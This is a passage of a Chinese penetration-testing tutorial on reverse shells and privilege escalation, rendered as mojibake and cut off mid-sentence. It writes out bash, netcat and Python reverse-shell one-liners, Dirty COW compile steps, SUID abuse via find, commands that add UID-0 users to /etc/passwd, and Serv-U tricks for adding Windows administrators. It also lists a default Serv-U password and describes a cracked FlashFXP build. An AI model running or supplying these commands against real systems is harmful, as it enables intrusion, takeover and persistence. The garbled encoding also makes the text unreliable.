è®²è§£ï¼šç»‘å®šREMOTEä¸»æœºçš„CMDSHELLå¹¶åå‘è¿æ¥åˆ°192.168.x.xçš„TCP5354ç«¯å£ä»¥ä¸Šä¸ºæœ€åŸºæœ¬çš„å‡ ç§ç”¨æ³•ï¼ˆå…¶å®NCçš„ç”¨æ³•è¿˜æœ‰å¾ˆå¤šï¼Œå½“é…åˆç®¡é“å‘½ä»¤â€|â€ä¸é‡å®šå‘å‘½ä»¤â€&lt;â€ã€â€&gt;â€ç­‰ç­‰å‘½ä»¤åŠŸèƒ½æ›´å¼ºå¤§â€¦â€¦ï¼‰ 2ã€åˆ©ç”¨bashç›´æ¥åå¼¹ğŸŸªç®€å•ä»‹ç»ä¸€ä¸‹bash Bashï¼ŒUnix shellçš„ä¸€ç§ï¼Œåœ¨1987å¹´ç”±å¸ƒè±æ©Â·ç¦å…‹æ–¯ä¸ºäº†GNUè®¡åˆ’è€Œç¼–å†™ã€‚1989å¹´å‘å¸ƒç¬¬ä¸€ä¸ªæ­£å¼ç‰ˆæœ¬ï¼ŒåŸå…ˆæ˜¯è®¡åˆ’ç”¨åœ¨GNUæ“ä½œç³»ç»Ÿä¸Šï¼Œä½†èƒ½è¿è¡Œäºå¤§å¤šæ•°ç±»Unixç³»ç»Ÿçš„æ“ä½œç³»ç»Ÿä¹‹ä¸Šï¼ŒåŒ…æ‹¬Linuxä¸Mac OS X v10.4éƒ½å°†å®ƒä½œä¸ºé»˜è®¤shellã€‚å®ƒæ”¯æŒæ–‡ä»¶åæ›¿æ¢ï¼ˆé€šé…ç¬¦åŒ¹é…ï¼‰ã€ç®¡é“ã€hereæ–‡æ¡£ã€å‘½ä»¤æ›¿æ¢ã€å˜é‡ï¼Œä»¥åŠæ¡ä»¶åˆ¤æ–­å’Œå¾ªç¯éå†çš„ç»“æ„æ§åˆ¶è¯­å¥ã€‚ ï¼ˆ1ï¼‰ bashåå¼¹ä¸€å¥è¯ 11.bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;8080 0&gt;&amp;1 12.æœ¬åœ° nc -l -p 8080 ï¼ˆ2ï¼‰bashä¸€å¥è¯å‘½ä»¤è¯¦è§£ä»¥ä¸‹é’ˆå¯¹å¸¸ç”¨çš„bashåå¼¹ä¸€å¥è¯è¿›è¡Œäº†æ‹†åˆ†è¯´æ˜ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹ã€‚ 12345 å‘½ä»¤ å‘½ä»¤è¯¦è§£bash -i äº§ç”Ÿä¸€ä¸ªbashäº¤äº’ç¯å¢ƒ&gt;&amp; å°†è”åˆç¬¦å·å‰é¢çš„å†…å®¹ä¸åé¢çš„ç›¸ç»“åˆç„¶åä¸€èµ·é‡å®šå‘ç»™åè€…&#x2F;dev&#x2F;tcp&#x2F;192.168.31.41&#x2F;8080 linuxç¯å¢ƒä¸­æ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼å­˜åœ¨çš„ï¼Œå…¶å®å¤§å®¶ä¸€çœ‹è§è¿™ä¸ªå†…å®¹å°±èƒ½æ˜ç™½ï¼Œå°±æ˜¯è®©ä¸»æœºä¸ç›®æ ‡ä¸»æœº192.168.61.41:8080ç«¯å£å»ºç«‹ä¸€ä¸ªTCPè¿æ¥ã€‚0&gt;&amp;1 å°†æ ‡å‡†çš„è¾“å…¥ä¸æ ‡å‡†è¾“å‡ºå†…å®¹ç›¸ç»“åˆï¼Œç„¶åé‡å®šå‘ç»™å‰é¢æ ‡å‡†çš„è¾“å‡ºå†…å®¹ã€‚ å…¶å®ä»¥ä¸Šbashåå¼¹ä¸€å¥å®Œæ•´çš„è§£è¯»è¿‡ç¨‹å°±æ˜¯ï¼šbashäº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒä¸æœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸ç›®æ ‡ä¸»æœº8080ç«¯å£å»ºç«‹çš„è¿æ¥ï¼ˆå³TCP 8080 ä¼šè¯è¿æ¥ï¼‰ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ªtcp 8080ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ªbash åå¼¹ç¯å¢ƒã€‚ äºŒã€è„ç‰›å†…æ ¸ææƒè„ç‰›æ¼æ´ï¼šåˆå«Dirty COWï¼Œå­˜åœ¨Linuxå†…æ ¸ä¸­å·²ç»æœ‰é•¿è¾¾9å¹´çš„æ—¶é—´ï¼Œåœ¨2007å¹´å‘å¸ƒçš„Linuxå†…æ ¸ç‰ˆæœ¬ä¸­å°±å·²ç»å­˜åœ¨æ­¤æ¼æ´ã€‚Linux kernelå›¢é˜Ÿåœ¨2016å¹´10æœˆ18æ—¥å·²ç»å¯¹æ­¤è¿›è¡Œäº†ä¿®å¤ã€‚è¿˜æœ‰ä¸€äº›å…¶ä»–çš„å†…æ ¸æ¼æ´ææƒäº†ã€‚ä½†æ˜¯å†…æ ¸æ¼æ´ææƒå¾ˆéš¾æˆåŠŸï¼Œå› ä¸ºå†…æ ¸ææƒå¯¹å†…æ ¸çš„ç‰ˆæœ¬ï¼Œè¿˜æœ‰ç›®æ ‡æœºå™¨çš„ç¯å¢ƒè¦æ±‚å¾ˆé«˜(éœ€è¦å®‰è£…æœ‰gccç­‰ç¼–è¯‘ç¯å¢ƒ )ã€‚æ‰€ä»¥ä½¿ç”¨å†…æ ¸ææƒæˆåŠŸç‡å¾ˆä½ã€‚å¹¶ä¸”å†…æ ¸ææƒéœ€è¦æŸ¥çœ‹expçš„æºä»£ç ï¼Œä¸ç„¶å¯èƒ½è¿ç¼–è¯‘éƒ½ä¸ä¼šã€‚ æ¼æ´èŒƒå›´ï¼šLinuxå†…æ ¸ &gt;= 2.6.22ï¼ˆ2007å¹´å‘è¡Œï¼Œåˆ°2016å¹´10æœˆ18æ—¥æ‰ä¿®å¤ï¼‰ ç®€è¦åˆ†æï¼šè¯¥æ¼æ´å…·ä½“ä¸ºï¼ŒLinuxå†…æ ¸çš„å†…å­˜å­ç³»ç»Ÿåœ¨å¤„ç†å†™å…¥å¤åˆ¶ï¼ˆcopy-on-write, COWï¼‰æ—¶äº§ç”Ÿäº†ç«äº‰æ¡ä»¶ï¼ˆrace conditionï¼‰ã€‚æ¶æ„ç”¨æˆ·å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ¥è·å–é«˜æƒé™ï¼Œå¯¹åªè¯»å†…å­˜æ˜ å°„è¿›è¡Œå†™è®¿é—®ã€‚ç«äº‰æ¡ä»¶ï¼ŒæŒ‡çš„æ˜¯ä»»åŠ¡æ‰§è¡Œé¡ºåºå¼‚å¸¸ï¼Œå¯å¯¼è‡´åº”ç”¨å´©æºƒï¼Œæˆ–ä»¤æ”»å‡»è€…æœ‰æœºå¯ä¹˜ï¼Œè¿›ä¸€æ­¥æ‰§è¡Œå…¶ä»–ä»£ç ã€‚åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œæ”»å‡»è€…å¯åœ¨å…¶ç›®æ ‡ç³»ç»Ÿæå‡æƒé™ï¼Œç”šè‡³å¯èƒ½è·å¾—rootæƒé™ã€‚ expï¼šhttps://github.com/gbonacini/CVE-2016-5195 åˆ©ç”¨gccç¼–è¯‘dirty.cæ–‡ä»¶ 1gcc -pthread dirty.c -o dirty -lcrypt æ‰§è¡Œå½“å‰ç¼–è¯‘çš„dirty.cæ–‡ä»¶ 1.&#x2F;dirty ç„¶åsu firefartåˆ‡æ¢åˆ°æ­¤ç”¨æˆ·ä¼šå‘ç°å·²ç»æ˜¯rootæƒé™äº†æ¢å¤å›å»ä½¿ç”¨ 1rename &#x2F;tmp&#x2F; ä¸‰ã€SUIDææƒç®€å•ä»‹ç»ä¸€ä¸‹æ¦‚å¿µ SUIDï¼ˆè®¾ç½®ç”¨æˆ·IDï¼‰æ˜¯èµ‹äºˆæ–‡ä»¶çš„ä¸€ç§æƒé™ï¼Œå®ƒä¼šå‡ºç°åœ¨æ–‡ä»¶æ‹¥æœ‰è€…æƒé™çš„æ‰§è¡Œä½ä¸Šï¼Œå…·æœ‰è¿™ç§æƒé™çš„æ–‡ä»¶ä¼šåœ¨å…¶æ‰§è¡Œæ—¶ï¼Œä½¿è°ƒç”¨è€…æš‚æ—¶è·å¾—è¯¥æ–‡ä»¶æ‹¥æœ‰è€…çš„æƒé™ã€‚ ä»€ä¹ˆæ˜¯SUIDææƒï¼Ÿ é‚£ä¹ˆä»€ä¹ˆæ˜¯suidææƒå‘¢ï¼Ÿæˆ‘ç†è§£çš„å°±æ˜¯æœ‰ä¸ªæ–‡ä»¶ï¼Œå®ƒæœ‰sæ ‡å¿—ï¼Œå¹¶ä¸”ä»–è¾“å…¥rootï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿è¡Œè¿™ä¸ªç¨‹åºå°±å¯ä»¥æœ‰äº†rootçš„æƒé™ï¼Œå¹¶ä¸”è¿™ä¸ªç¨‹åºè¿˜å¾—èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œä¸ç„¶æ²¡ä»€ä¹ˆç”¨å¤„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½ä»æ™®é€šç”¨æˆ·æå‡åˆ°äº†rootæƒé™äº†ã€‚ é¦–å…ˆåœ¨æœ¬åœ°æŸ¥æ‰¾ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ï¼Œæœ‰ä»¥ä¸‹ä¸‰ä¸ªå‘½ä»¤ 1234#ä»¥ä¸‹å‘½ä»¤å°†å°è¯•æŸ¥æ‰¾å…·æœ‰rootæƒé™çš„SUIDçš„æ–‡ä»¶ï¼Œä¸åŒç³»ç»Ÿé€‚ç”¨äºä¸åŒçš„å‘½ä»¤ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; å·²çŸ¥çš„å¯ç”¨æ¥ææƒçš„linuxå¯è¡Œæ€§çš„æ–‡ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š 12345678nmapvimfindbashmorelessnanocp åˆ©ç”¨findæ–‡ä»¶ææƒå‡å¦‚æˆ‘ä»¬ç°åœ¨æ‹¿åˆ°äº†ä¸€ä¸ªç½‘ç«™æœåŠ¡å™¨çš„shellï¼Œä½†æ˜¯æƒé™æ˜¯ubuntuï¼Œæˆ‘ä»¬ç°åœ¨éœ€è¦ææƒåˆ° root ç”¨æˆ·æƒé™ã€‚ æˆ‘ä»¬æŸ¥çœ‹å…·æœ‰rootç”¨æˆ·æƒé™çš„SUIDæ–‡ä»¶ 1find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null æˆ‘ä»¬éšä¾¿æ‰¾ä¸€ä¸ªå‘½ä»¤è¿›è¡Œåˆ©ç”¨ï¼Œæˆ‘ä»¬å°±æ‰¾findï¼Œå…ˆæŸ¥çœ‹å…¶ä¿¡æ¯ï¼Œå‘ç°å…¶ç¡®å®æ˜¯rootç”¨æˆ·æƒé™çš„SUIDçš„æ–‡ä»¶ æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹æ˜¯å¦èƒ½ç”¨findå‘½ä»¤ä»¥rootæƒé™è¿è¡Œï¼Œå‘ç°ç¡®å®å¯ä»¥ä»¥rootæƒé™è¿è¡Œ 1&#x2F;usr&#x2F;bin&#x2F;find examples.desktop -exec whoami \\; ç„¶åæˆ‘ä»¬æŸ¥çœ‹ç›®æ ‡ç½‘ç«™ä¸Šæ˜¯å¦æœ‰pythonç¯å¢ƒï¼Œå¯ä»¥çœ‹åˆ°æœ‰python2.7.6çš„ç¯å¢ƒ äºæ˜¯æˆ‘ä»¬ä»¥rootç”¨æˆ·çš„èº«ä»½åˆ©ç”¨pythonåå¼¹shellï¼Œ 1python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.10.25&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; #åå¼¹ä¸€ä¸ªshç±»å‹çš„shell å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ”»å‡»ç«¯æ”¶åˆ°äº†åå¼¹è¿‡æ¥çš„shellï¼Œå¹¶ä¸”æ˜¯rootèº«ä»½ æœ¬èŠ‚æ¥è‡ªè°¢å…¬å­çš„åšå®¢ï¼šhttps://blog.csdn.net/qq_36119192/article/details/84872644 å››ã€Linuxé…ç½®é”™è¯¯ææƒè¿˜æœ‰å°±æ˜¯åˆ©ç”¨Linuxçš„é…ç½®æ–‡ä»¶é”™è¯¯ï¼Œå¯¼è‡´ /etc/passwd æ–‡ä»¶å¯å†™å…¥ææƒï¼š å¯¹Linuxé…ç½®è¿›è¡Œæ£€æŸ¥çš„è„šæœ¬æœ‰ï¼šhttps://www.securitysift.com/download/linuxprivchecker.pyhttp://pentestmonkey.net/tools/audit/unix-privesc-check å½“æˆ‘ä»¬è·å¾—äº†æŸä¸ªLinuxæœåŠ¡å™¨çš„ä½æƒé™ä¹‹åï¼Œæˆ‘ä»¬æƒ³è¦å¯¹è¯¥ä½æƒé™è´¦å·è¿›è¡Œææƒï¼Œä»¥æ‰§è¡Œæ›´å¤šçš„æ“ä½œã€‚æ¥ä¸‹æ¥æˆ‘ä»¬çš„ææƒæ˜¯åˆ©ç”¨ /etc/passwd æ–‡ä»¶çš„å¯å†™å…¥æƒé™ï¼Œå¯¼è‡´æˆ‘ä»¬å†™å…¥ä¸€ä¸ªå…¶ä»–ç”¨æˆ·è¿›å»ã€‚é¦–å…ˆï¼ŒæŸ¥çœ‹ /etc/passwd çš„æƒé™ï¼Œå‘ç°ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥è¯»å†™ã€‚ æˆ‘ä»¬ç°åœ¨è¦åšçš„å°±æ˜¯è‡ªå·±æ„é€ ä¸€ä¸ªç”¨æˆ·ï¼Œåœ¨å¯†ç å ä½ç¬¦å¤„æŒ‡å®šå¯†ç ï¼Œå¹¶ä¸”UIDè®¾ç½®ä¸º0ï¼Œå°†å…¶æ·»åŠ åˆ° /etc/passwd æ–‡ä»¶ä¸­ã€‚ é¦–å…ˆï¼Œä½¿ç”¨perlè¯­è¨€ç”Ÿæˆå¸¦æœ‰ç›å€¼çš„å¯†ç ï¼š 1perl -le &#39;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#39; ç„¶åæ‰§è¡Œä¸‹é¢è¿™æ¡å‘½ä»¤ï¼ŒæˆåŠŸå°†testç”¨æˆ·çš„ä¿¡æ¯åŠ å…¥ /etc/passwd æ–‡ä»¶ 1echo &quot;test:advwtv&#x2F;9yU5yQ:0:0:User_like_root:&#x2F;root:&#x2F;bin&#x2F;bash&quot; &gt;&gt;&#x2F;etc&#x2F;passwd ä»¥ç”¨æˆ·åï¼štest å¯†ç ï¼š password@123 ç™»å½•ä¸»æœºï¼Œç™»å½•æˆåŠŸåï¼Œæ˜¯ root æƒé™ã€‚ ä»¥ä¸‹è¿™æ¡å‘½ä»¤ç›´æ¥ç”Ÿæˆä¸€ä¸ªå…·æœ‰rootæƒé™çš„ç”¨æˆ·ï¼švenusï¼Œå¯†ç ä¸ºï¼š123qwe ã€‚å‰ææ˜¯è¿™æ¡å‘½ä»¤çš„æ‰§è¡Œéœ€è¦rootæƒé™ã€‚ 1useradd -p &#96;openssl passwd -1 -salt &#39;user&#39; 123qwe&#96; -u 0 -o -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;user venus æœ¬ç« æ¥è‡ªäºè°¢å…¬å­çš„åšå®¢ï¼šhttps://blog.csdn.net/qq_36119192/article/details/99871667 äº”ã€å®šæ—¶ä»»åŠ¡ææƒç³»ç»Ÿå†…å¯èƒ½ä¼šæœ‰ä¸€äº›å®šæ—¶æ‰§è¡Œçš„ä»»åŠ¡ï¼Œä¸€èˆ¬è¿™äº›ä»»åŠ¡ç”±crontabæ¥ç®¡ç†ï¼Œå…·æœ‰æ‰€å±ç”¨æˆ·çš„æƒé™ã€‚érootæƒé™çš„ç”¨æˆ·æ˜¯ä¸å¯ä»¥åˆ—å‡ºroot ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡çš„ã€‚ä½†æ˜¯ /etc/ å†…ç³»ç»Ÿçš„è®¡åˆ’ä»»åŠ¡å¯ä»¥è¢«åˆ—å‡ºã€‚é»˜è®¤è¿™äº›ç¨‹åºä»¥rootæƒé™æ‰§è¡Œï¼Œå¦‚æœæœ‰å¹¸é‡åˆ°ä¸€ä¸ªæŠŠå…¶ä¸­è„šæœ¬é…ç½®æˆä»»æ„ç”¨æˆ·å¯å†™ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹è„šæœ¬è¿›è¡Œææƒäº†ã€‚ 1ls -l &#x2F;etc&#x2F;cron* ä½¿ç”¨è¯¥å‘½ä»¤ï¼Œåˆ—å‡ºçš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ /etc/cron.daily ã€/etc/cron.hourlyã€/etc/cron.monthlyã€/etc/cron.weekly è¿™å››ä¸ªæ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹æ˜¯å¦å…è®¸å…¶ä»–ç”¨æˆ·ä¿®æ”¹ã€‚å¦‚æœ å…è®¸ä»»æ„ç”¨æˆ·ä¿®æ”¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾€è¿™äº›æ–‡ä»¶é‡Œé¢å†™å…¥åå¼¹shellçš„è„šæœ¬ææƒäº†ã€‚ å…­ã€å¯†ç å¤ç”¨ææƒæˆ‘ä»¬å¦‚æœåœ¨ä¸»æœºä¸Šæ‰¾åˆ°äº†å…¶ä»–åº”ç”¨æˆ–æ•°æ®åº“çš„å¯†ç ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½rootç”¨æˆ·ä¹Ÿç”¨è¯¥å¯†ç ã€‚é‚£ä¹ˆå°±å¯ä»¥å°è¯•ä¸€ä¸‹ su root æ¥ææƒäº†ã€‚ ä¸ƒã€ReDuhå†…ç½‘ç«¯å£è½¬å‘ReDuhæ˜¯å¯ä»¥æŠŠå†…ç½‘æœåŠ¡å™¨çš„ç«¯å£é€šè¿‡httpæˆ–httpséš§é“è½¬å‘åˆ°æœ¬æœºï¼Œå½¢æˆä¸€ä¸ªTCPè¿é€šå›è·¯ï¼Œç”¨äºç›®æ ‡æœåŠ¡å™¨åœ¨å†…ç½‘æˆ–åšäº†ç«¯å£ç­–ç•¥çš„æƒ…å†µä¸‹è¿æ¥ç›®æ ‡æœåŠ¡å™¨å†…éƒ¨ç«¯å£çš„å·¥å…·ã€‚ è¯¦ç»†ä»‹ç»:http://www.cnblogs.com/huhu0013/p/4567319.html å…«ã€å†…ç½‘æ¸—é€ç¥å™¨ReGeorgReGeorgæ˜¯ReDuhçš„ç»§æ‰¿è€…ã€‚ä¸»è¦æ˜¯æŠŠå†…ç½‘æœåŠ¡å™¨çš„ç«¯å£é€šè¿‡http/httpséš§é“è½¬å‘åˆ°æœ¬æœºï¼Œå½¢æˆä¸€ä¸ªå›è·¯ã€‚ç”¨äºç›®æ ‡æœåŠ¡å™¨åœ¨å†…ç½‘æˆ–åšäº†ç«¯å£ç­–ç•¥çš„æƒ…å†µä¸‹è¿æ¥ç›®æ ‡æœåŠ¡å™¨å†…éƒ¨å¼€æ”¾ç«¯å£ã€‚ è¯¦ç»†ä»‹ç»:http://iscc.gxu.edu.cn/index.php/News/show/id/34 ç¬¬ä¸‰æ–¹è½¯ä»¶ ææƒServ-U FTP Serverï¼Œæ˜¯ä¸€ç§è¢«å¹¿æ³›è¿ç”¨çš„FTPæœåŠ¡å™¨ç«¯è½¯ä»¶ï¼Œæ”¯æŒ3x/9x/ME/NT/2Kç­‰å…¨Windowsç³»åˆ—ã€‚å¯ä»¥è®¾å®šå¤šä¸ªFTPæœåŠ¡å™¨ã€é™å®šç™»å½•ç”¨æˆ·çš„æƒé™ã€ç™»å½•ä¸»ç›®å½•åŠç©ºé—´å¤§å°ç­‰ Serv-Uææƒåˆ†ä¸¤ç§1.æœ‰ä¿®æ”¹æƒé™ 2.æ— æƒé™ä¿®æ”¹ æœ‰ä¿®æ”¹æƒé™0.åˆ¤æ–­æ˜¯å¦å®‰è£…serv-u serv-uçš„é»˜è®¤ç«¯å£æ˜¯43958 å¯ä»¥ç”¨nmap æ‰«æç¡®è®¤ 1.æ£€æŸ¥æ˜¯å¦æœ‰å¯å†™æƒé™ 1ã€é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ææƒ é¦–å…ˆæ‰¾é…ç½®æ–‡ä»¶ä¸€èˆ¬å®‰è£…ç›®å½• c:\\Program Files\\Serv-u\\SerUDaemon.ini ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæœ€åæäº¤ï¼ŒæˆåŠŸæ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œæœ‰æƒé™çš„ç³»ç»Ÿç®¡ç†å‘˜å¤åˆ¶ä¸€ä¸ª ä¿®æ”¹åå­—password å¯†ç æ ¼å¼ æ˜¯ gw+md5 æˆ‘ä»https://www.cmd5.com/ æŠŠgw123456 åŠ å¯† æ³¨æ„gwæ˜¯ä»–çš„ å±äºå¯†ç è§„åˆ™æŠŠåŠ å¯†å®Œçš„å¯†ç å»æ›¿æ¢å¤åˆ¶çš„å¯†ç  password=gw+md5(gw123456)maintenance=system æ˜¯ä»£è¡¨ç³»ç»Ÿæƒé™ user=ä½ å‘½åçš„ç”¨æˆ· æ‰¾åˆ°å®‰è£…ç›®å½•ï¼Œå°†æ–‡ä»¶æ·»åŠ ä¸€ä¸ªæœ‰ä¿®æ”¹æƒé™ æˆåŠŸæ·»åŠ ç³»ç»Ÿç®¡ç†å‘˜ å¯†ç ç”¨cmd5è§£å¯†ï¼Œ=åé¢ä¸¤ä½ä¸ç”¨ç®¡ï¼Œç›´æ¥è§£å¯†åé¢å°±ok æˆåŠŸæ·»åŠ ç”¨æˆ·åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å·¥å…·FlashFXPè¿›è¡Œè¿æ¥ ä¹Ÿå¯ä»¥ç”¨cmd.exeè¿æ¥ cmdè®¿é—® ftp è¿æ¥ ip è¾“å…¥ä½ åˆšåˆšæ·»åŠ çš„ç”¨æˆ·å¯†ç  è¾“å…¥ 123quote site exec net user username password &#x2F;addquote site exec net localgroup administrators username &#x2F;add åˆ©ç”¨ftpå‘½ä»¤quote site exec æ·»åŠ ç”¨æˆ· åŠ å…¥administrators æƒé™ç»„ æ‰“å¼€3389è¿æ¥ æ— ä¿®æ”¹æƒé™1.åˆ©ç”¨md5 ç›´æ¥å»è§£å¯†ï¼ˆini æ–‡ä»¶å¯†ç åœ¨ftpè¿ï¼‰ 2.é»˜è®¤å¯†ç ï¼Œé»˜è®¤ç”¨æˆ· è´¦æˆ·ï¼šLocalAdministrator ï¼Œå¯†ç ï¼š#l@$ak#.lk;0@P å‘½ä»¤cmd /c net user DisKill /add &amp; net localgroup administrators DisKill /add æ·»åŠ äº†ä¸€ä¸ªéšè—ç”¨æˆ·æŸ¥çœ‹æ–¹æ³•net user tls$ 3.ä¸æ˜¯é»˜è®¤å¯†ç æ—¶ ç›´æ¥æŠŠSerUAdmin.exe ä¸‹è½½ä¸‹æ¥ è¿›è¡ŒæŸ¥çœ‹å¯†ç  è®°ä½è¿™é‡Œé€‰anå­—ç¬¦ä¸² . åé¢å°±æ˜¯å¯†ç  æŠŠå®ƒæ›¿æ¢åˆ° è¿™ä¹Ÿå«æº¢å‡ºææƒ FlashFXP æ›¿æ¢æ–‡ä»¶æ¼æ´ææƒ0x01 å‰è¨€ ä»‹ç»FlashFXPæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ FXP/FTP è½¯ä»¶ï¼Œèåˆäº†ä¸€äº›å…¶ä»–ä¼˜ç§€ FTPè½¯ä»¶çš„ä¼˜ç‚¹ï¼Œå¦‚åƒ CuteFTP ä¸€æ ·å¯ä»¥æ¯”è¾ƒæ–‡ä»¶å¤¹ï¼Œæ”¯æŒå½©è‰²æ–‡å­—æ˜¾ç¤ºï¼›åƒ BpFTP æ”¯æŒå¤šæ–‡ä»¶å¤¹é€‰æ‹©æ–‡ä»¶ï¼Œèƒ½å¤Ÿç¼“å­˜æ–‡ä»¶å¤¹ï¼›åƒ LeapFTP ä¸€æ ·çš„å¤–è§‚ç•Œé¢ï¼Œç”šè‡³è®¾è®¡æ€è·¯ä¹Ÿå·®ç›¸ä»¿ä½›ã€‚æ”¯æŒä¸Šä¼ ã€ä¸‹è½½åŠç¬¬ä¸‰æ–¹æ–‡ä»¶ç»­ä¼ ï¼›å¯ä»¥è·³è¿‡æŒ‡å®šçš„æ–‡ä»¶ç±»å‹ï¼Œåªä¼ é€ éœ€è¦çš„æ–‡ä»¶ï¼›å¯ä»¥è‡ªå®šä¹‰ä¸åŒæ–‡ä»¶ç±»å‹çš„æ˜¾ç¤ºé¢œè‰²ï¼›å¯ä»¥ç¼“å­˜è¿œç«¯æ–‡ä»¶å¤¹åˆ—è¡¨ï¼Œæ”¯æŒFTPä»£ç†åŠ Socks 3&amp;4ï¼›å…·æœ‰é¿å…ç©ºé—²åŠŸèƒ½ï¼Œé˜²æ­¢è¢«ç«™ç‚¹è¸¢å‡º ç”¨é€”FlashFXPå¯ç”¨äºï¼š 12345â€¢ å‘å¸ƒå’Œç»´æŠ¤ä½ çš„ç½‘ç«™ã€‚â€¢ ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶ï¼Œç…§ç‰‡ï¼Œè§†é¢‘ï¼ŒéŸ³ä¹å’Œæ›´å¤šï¼â€¢ æœ¬åœ°å’Œè¿œç¨‹æ–‡ä»¶ä¼ è¾“æˆ–å¤‡ä»½ã€‚â€¢ å…±äº«æ‚¨çš„æ–‡ä»¶ä¸æ‚¨çš„æœ‹å‹å’ŒåŒäº‹ä½¿ç”¨åŠŸèƒ½å¼ºå¤§çš„ç«™ç‚¹ç®¡ç†å™¨ã€‚â€¢ æˆ‘ä»¬å¼ºå¤§çš„ä¼ è¾“è°ƒåº¦å®‰æ’å’Œè‡ªåŠ¨åŒ–æ–‡ä»¶ä¼ è¾“ã€‚ ç‰¹ç‚¹12345671ï¼‰ åŸºäºå®˜æ–¹ä¾¿æºå®‰è£…ç‰ˆç ´è§£æ‰“åŒ…ï¼Œå»åç»­æ£€æµ‹æ›´æ–°æç¤º2ï¼‰ é›†æˆå¯†é’¥æ–‡ä»¶ï¼Œå¯åŠ¨å³ä¸ºå·²æˆæƒç‰ˆ3ï¼‰ ç¦æ­¢è”ç½‘éªŒè¯æ³¨å†Œä¿¡æ¯ï¼Œåç»­ä¸åå¼¹4ï¼‰ è¡¥å……æ±‰åŒ–ç¿»è¯‘äº†å®˜æ–¹ç®€ä½“ä¸­æ–‡è¯­è¨€ï¼Œé»˜è®¤å¯åŠ¨ä¸ºä¸­æ–‡ï¼Œåˆ å¤šè¯­è¨€ã€å¸®åŠ©æ–‡æ¡£ 4.x **FlashFXP ä¸­çš„â€œFXPâ€ æ˜¯ä»€ä¹ˆæ„æ€? ** 123FXPæ˜¯æŒ‡åœ¨ä¸¤å°æœåŠ¡ä¹‹é—´çš„ç›´çº¿ä¼ è¾“ã€‚ä¹Ÿå¯ä»¥ç§°ä¸ºâ€œç«™åˆ°ç«™ä¼ è¾“â€(Site to Site Transfers)ã€‚**æ³¨ï¼š**FXPè¿‡ç¨‹éœ€è¦æœåŠ¡ä¸¤å°æœåŠ¡å™¨å‡æ”¯æŒæ–¹å¯è¿›è¡Œã€‚å®ƒåˆ©ç”¨æœåŠ¡å™¨ä¹‹é—´çš„é«˜é€Ÿè¿æ¥ï¼Œå®ç°æ–‡ä»¶çš„é«˜æ•ˆä¼ è¾“ï¼Œå‡ ä¹ä¸ä¼šå ç”¨æœ¬æœºçš„å¸¦å®½èµ„æºã€‚ FlashFXP çš„ä¸è¶³? 1FlashFXP æ— æ³•åƒCuteFTPé‚£æ ·å®ç°çš„å¤šçª—åŠŸèƒ½ï¼ŒCuteFTP å¯åœ¨ä¸€ä¸ªçª—å£ä¸­æ‰“å¼€å¤šä¸ªç«™ç‚¹ã€‚æ­¤å¤–ï¼ŒFlashFXP å°šä¸æ”¯æŒå¤šè¿›ç¨‹ä¼ è¾“ï¼Œæ‰€æœ‰çš„ä¸‹è½½å’Œä¸Šä¼ ä»»åŠ¡å‡æ˜¯ä»¥å•çº¿ç¨‹è¿›è¡Œã€‚ 0x02 ç¯å¢ƒé…ç½® æ“ä½œç³»ç»Ÿï¼šwindows 2003 ä¼ä¸šç‰ˆ FTPæœåŠ¡ï¼šä½¿ç”¨serv-uæœåŠ¡å™¨ï¼Œå¸¸è§„ææƒæ–¹æ³•å‡å¤±æ•ˆ æƒé™æƒ…å†µï¼šå…¶ä»–å¸¸è§„æ–¹æ³•éƒ½æ— æ³•ææƒ ä½¿ç”¨å·¥å…·ï¼šASPã€. 